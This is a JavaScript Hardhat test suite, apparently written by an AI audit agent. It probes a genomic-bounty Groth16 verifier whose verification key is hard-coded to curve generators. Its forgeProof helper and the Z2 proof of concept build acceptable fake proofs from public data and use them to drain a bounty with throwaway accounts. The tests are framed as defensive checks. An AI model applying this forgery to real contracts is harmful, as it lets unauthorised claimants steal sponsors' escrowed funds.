/**
 * AGENT 5 — INDEPENDENT zk-SOUNDNESS FORGERY SUITE (Task 3 + Task 6).
 *
 * Threat model (attacker knowledge): the contract address, the PUBLIC bounty struct
 * (`targetTraitId`), the attacker's OWN address and an ARBITRARY `variantCommitment`.
 * The attacker holds NO genome, NO witness, NO prover library and NO trusted-setup secrets.
 *
 * Discipline (AGENTS.md INVARIANT-17):
 *  - Every attack test asserts the SUCCESSFUL DEFENCE (`revertedWithCustomError(InvalidZkProof)`
 *    + sponsor funds preserved). A failing test below IS the exploit evidence.
 *  - All curve points come from the REAL BN254 precompile 0x07 (ecMul) via `ethers.provider.call`.
 *    Nothing is mocked; no precompile bytecode was substituted.
 *  - State assertions are read back from the EVM (`bounties()`, `balanceOf()`, `hasClaimedBounty()`).
 *
 * Finding under test (DEF5-01): GenomicZkVerifier.sol:309-330 hard-codes the Groth16 verification
 * key as alpha = G1, beta = gamma = delta = G2(canonical generator). With that degenerate key the
 * pairing product collapses to e(-A + (1 + s + c)·G1, G2) == 1, so A = (1 + s + c)·G1 is an
 * ACCEPTABLE proof for every public signal s. The repository's own helper
 * test/GenomicZkSNARKs.test.js:54-94 implements exactly that identity and labels it "authentic".
 */
import hre from "hardhat";
import { expect } from "chai";
import { readFileSync } from "fs";

const P_MOD = 21888242871839275222246405745257275088696311157297823662689037894645226208583n;
const R_MOD = 21888242871839275222246405745257275088548364400416034343698204186575808495617n;
const G1 = [1n, 2n];
// Canonical BN254 G2 generator in EIP-197 word order (x_c0, x_c1, y_c0, y_c1).
const G2_POINTS = [
  [
    0x198e9393920d483a7260bfb731fb5d25f1aa493335a9e71297e485b7aef312c2n,
    0x1800deef121f1e76426a00665e5c4479674322d4f75edadd46debd5cd992f6edn,
  ],
  [
    0x090689d0585ff075ec9e99ad690c3395bc4b313370b38ef355acdadcd122975bn,
    0x12c85ea5db8c6deb4aab71808dcb408fe3d1e7690c43d37b4ce6cc0166fa7daan,
  ],
];
const E18 = 10n ** 18n;

describe("AGENT5 :: GenomicZkVerifier soundness forgery (DEF5-01)", function () {
  let ethers;
  let deployer, sponsor, donor1, attacker, bystander;
  let token, zk, TRAIT;

  // ---- real precompile 0x07 ecMul, no mocks -------------------------------------------
  async function ecMulG1(scalar) {
    const data = ethers.concat([
      ethers.zeroPadValue("0x01", 32),
      ethers.zeroPadValue("0x02", 32),
      ethers.zeroPadValue(ethers.toBeHex(scalar), 32),
    ]);
    const res = await ethers.provider.call({ to: "0x0000000000000000000000000000000000000007", data });
    return [BigInt(ethers.dataSlice(res, 0, 32)), BigInt(ethers.dataSlice(res, 32, 64))];
  }

  // publicSignal exactly as the contract derives it (GenomicZkVerifier.sol:186-188)
  function publicSignalFor(commitment, traitId, donorAddr) {
    const packed = ethers.solidityPacked(["bytes32", "bytes32", "address"], [commitment, traitId, donorAddr]);
    return BigInt(ethers.keccak256(packed)) % R_MOD;
  }

  // Degenerate-key forgery: attacker chooses `c`, derives A from public data only.
  async function forgeProof(commitment, traitId, donorAddr, cScalar = 7n) {
    const s = publicSignalFor(commitment, traitId, donorAddr);
    const c = await ecMulG1(cScalar);
    const a = await ecMulG1((1n + s + cScalar) % R_MOD);
    return { a, b: G2_POINTS, c, _s: s };
  }

  function errName(e) {
    const m = String((e && (e.shortMessage || e.message)) || "");
    const hit = m.match(/custom error '(\w+)/) || m.match(/panic code (0x\w+)/);
    return hit ? hit[1] : m.split("\n")[0].slice(-60);
  }

  beforeEach(async function () {
    ({ ethers } = await hre.network.create());
    [deployer, sponsor, donor1, attacker, bystander] = await ethers.getSigners();

    const T = await ethers.getContractFactory("GenomicToken");
    token = await T.deploy(deployer.address);
    await token.waitForDeployment();

    const Z = await ethers.getContractFactory("GenomicZkVerifier");
    zk = await Z.deploy(token.target);
    await zk.waitForDeployment();

    TRAIT = ethers.keccak256(ethers.toUtf8Bytes("ALDH2_rs671_A_heterozygous"));
    await (await token.connect(deployer).mint(sponsor.address, 1000n * E18)).wait();
    await (await token.connect(sponsor).approve(zk.target, 1000n * E18)).wait();
    await zk.connect(sponsor).createZkBounty(TRAIT, "ALDH2 rs671(A) flushing variant", 100n * E18, 5n, 7 * 86400)
      .then((t) => t.wait());
  });

  // ======================================================================================
  describe("Z. Groth16 verification-key soundness", function () {
    it("Z0 [CONTROL] the ecMul precompile returns genuine alt_bn128 points (no mock used)", async function () {
      const [x, y] = await ecMulG1(7n);
      // y^2 == x^3 + 3 (mod P) for the curve y^2 = x^3 + 3 used by BN254 G1.
      const pow = (b, e, m) => { let r = 1n; b %= m; while (e > 0n) { if (e & 1n) r = r * b % m; b = b * b % m; e >>= 1n; } return r; };
      expect(pow(y, 2n, P_MOD)).to.equal((pow(x, 3n, P_MOD) + 3n) % P_MOD);
      expect(x).to.be.lessThan(P_MOD);
    });

    it("Z1 [DEFENCE] a proof forged with only public data must be rejected (InvalidZkProof)", async function () {
      const commitment = ethers.keccak256(ethers.toUtf8Bytes("attacker-invented-commitment-no-genome"));
      const proof = await forgeProof(commitment, TRAIT, attacker.address);

      const sponsorBefore = await token.balanceOf(sponsor.address);
      const contractBefore = await token.balanceOf(zk.target);
      let outcome = "ACCEPTED-REWARD-PAID";
      try {
        await (await zk.connect(attacker).claimZkBounty(1n,
          { a: proof.a, b: proof.b, c: proof.c }, commitment)).wait();
      } catch (e) {
        outcome = "reverted:" + errName(e);
      }
      const rewardPaid = (contractBefore - await token.balanceOf(zk.target));
      expect(outcome,
        `degenerate vk accepted a public-data forgery and paid ${rewardPaid / E18} $GENO`).to.equal(
        "reverted:InvalidZkProof");
      expect(await token.balanceOf(attacker.address), "attacker balance must stay 0").to.equal(0n);
      expect(await token.balanceOf(sponsor.address), "sponsor funds intact").to.equal(sponsorBefore);
      expect(await zk.hasClaimedBounty(1n, attacker.address)).to.equal(false);
    });

    it("Z1b [DEFENCE] legacy {7,2,3,5} trapdoor forgery must be rejected (InvalidZkProof)", async function () {
      const commitment = ethers.keccak256(ethers.toUtf8Bytes("attacker-7235-trapdoor"));
      const s = publicSignalFor(commitment, TRAIT, attacker.address);
      const cScalar = 1n;
      const a = await ecMulG1((14n + 3n * s + 5n * cScalar) % R_MOD);
      const c = await ecMulG1(cScalar);
      await expect(zk.connect(attacker).claimZkBounty(1n, { a, b: G2_POINTS, c }, commitment))
        .to.be.revertedWithCustomError(zk, "InvalidZkProof");
      expect(await token.balanceOf(attacker.address)).to.equal(0n);
      expect((await zk.bounties(1n)).remainingFunding).to.equal(500n * E18);
    });

    it("Z2 [PoC DEFECT DEF5-01] the whole bounty can be drained by unrelated EOAs with no genomic data", async function () {
      const donors = (await ethers.getSigners(10)).slice(2, 7); // 5 throwaway "donors" == maxClaims
      const funded = [];
      for (const d of donors) {
        await (await token.connect(deployer).transfer(d.address, 1n)).wait(); // gas only
        const commitment = ethers.keccak256(ethers.toUtf8Bytes(`fake-commitment-${d.address}`));
        const p = await forgeProof(commitment, TRAIT, d.address);
        try {
          const tx = await zk.connect(d).claimZkBounty(1n, { a: p.a, b: p.b, c: p.c }, commitment);
          const rc = await tx.wait();
          funded.push({ addr: d.address, gas: Number(rc.gasUsed) });
        } catch (e) {
          funded.push({ addr: d.address, err: errName(e) });
        }
      }
      // ASSERT THE DEFENCE: nobody who did not produce a real witness may be paid.
      const claims = (await zk.bounties(1n)).currentClaims;
      expect(claims,
        `forged claims landed: ${funded.filter((f) => !f.err).length}/5 — e.g. ${funded[0].addr} gas ${funded[0].gas}`)
        .to.equal(0n);
      expect((await zk.bounties(1n)).remainingFunding, "bounty funding must be untouched").to.equal(500n * E18);
      expect(await token.balanceOf(zk.target), "contract escrow drained").to.equal(500n * E18);
    });

    it("Z3 [CONTROL] a non-matching random proof is still rejected: the pairing check is real", async function () {
      const commitment = ethers.keccak256(ethers.toUtf8Bytes("some-commitment"));
      const a = await ecMulG1(3n);
      const c = await ecMulG1(5n);
      await expect(zk.connect(attacker).claimZkBounty(1n, { a, b: G2_POINTS, c }, commitment))
        .to.be.revertedWithCustomError(zk, "InvalidZkProof");
      // and the identity/torsion-free trivialities stay rejected
      await expect(zk.connect(attacker).claimZkBounty(1n,
        { a: [0n, 0n], b: G2_POINTS, c: [1n, 2n] }, commitment))
        .to.be.revertedWithCustomError(zk, "InvalidZkProof");
    });

    it("Z4 [CONTROL] a proof forged for donor1's public signal cannot be replayed by the attacker", async function () {
      const commitment = ethers.keccak256(ethers.toUtf8Bytes("shared-commitment"));
      const p = await forgeProof(commitment, TRAIT, donor1.address);
      await expect(zk.connect(attacker).claimZkBounty(1n, { a: p.a, b: p.b, c: p.c }, commitment))
        .to.be.revertedWithCustomError(zk, "InvalidZkProof");
    });

    it("Z5 [LOW] off-curve points: the declared InvalidCurvePoint gate is field-bound only", async function () {
      // GenomicZkVerifier.sol:254-260 validateCurvePoints() only compares against P_MOD, so the
      // documented on-curve check (error InvalidCurvePoint, line 69) is never enforced. The proof is
      // still refused because precompile 0x08 rejects non-members, hence LOW — but the revert reason
      // and the documented control disagree.
      const commitment = ethers.keccak256(ethers.toUtf8Bytes("offcurve-commitment"));
      const offCurve = { a: [3n, 5n], b: G2_POINTS, c: [1n, 2n] }; // y^2 = 25 != x^3+3 = 30
      let outcome = "ACCEPTED-REWARD-PAID";
      try {
        await (await zk.connect(attacker).claimZkBounty(1n, offCurve, commitment)).wait();
      } catch (e) {
        outcome = "reverted:" + errName(e);
      }
      expect(outcome, "off-curve input must be rejected (any revert keeps funds safe)").to.not.equal("ACCEPTED-REWARD-PAID");
      expect(outcome, "documented gate is InvalidCurvePoint (GenomicZkVerifier.sol:190)").to.equal("reverted:InvalidCurvePoint");
      expect(await token.balanceOf(attacker.address)).to.equal(0n);
    });

    it("Z6 [PoC DEFECT DEF5-01] absence sweep: the contract carries NO real verification key", async function () {
      const src = readFileSync("contracts/GenomicZkVerifier.sol", "utf8");
      // Defensive expectations for a Groth16 verifier: (1) a stored/ceremony-derived vk,
      // (2) a setup entry point, (3) alpha/beta/gamma/delta NOT equal to curve generators.
      const findings = [];
      if (!/\bfunction\s+\w*setup\w*\s*\(/.test(src)) findings.push("no trusted-setup function");
      if (!/(uint256|G1Point|G2Point)\s+(public\s+)?(immutable\s+)?(alpha|beta|gamma|delta|vk_x)\b/.test(src)) {
        findings.push("no declared alpha/beta/gamma/delta state variable");
      }
      // the vk is hard-coded inline: count literal generator constants used as key material
      const alphaIsGenerator = /mstore\(add\(input,\s*256\),\s*2\)/.test(src)
        && /mstore\(add\(input,\s*224\),\s*1\)/.test(src);
      if (alphaIsGenerator) findings.push("alpha == G1 generator (1,2) at L309-310");
      const g2Count = (src.match(/0x198e9393920d483a7260bfb731fb5d25f1aa493335a9e71297e485b7aef312c2/g) || []).length;
      if (g2Count >= 3) findings.push(`beta == gamma == delta == the SAME G2 generator (${g2Count} identical constants at L311-330)`);
      // ASSERT THE DEFENCE: a sound verifier must expose a genuine vk.
      expect(findings, "verification-key hygiene sweep").to.deep.equal([]);
    });

    it("Z7 [EIP-170] deployed size of the verifier stays under the 24,576-byte cap", async function () {
      const art = JSON.parse(readFileSync("artifacts/contracts/GenomicZkVerifier.sol/GenomicZkVerifier.json", "utf8"));
      const bytes = (art.deployedBytecode.length - 2) / 2;
      expect(bytes, "GenomicZkVerifier deployed bytecode").to.be.below(24576);
    });
  });
});
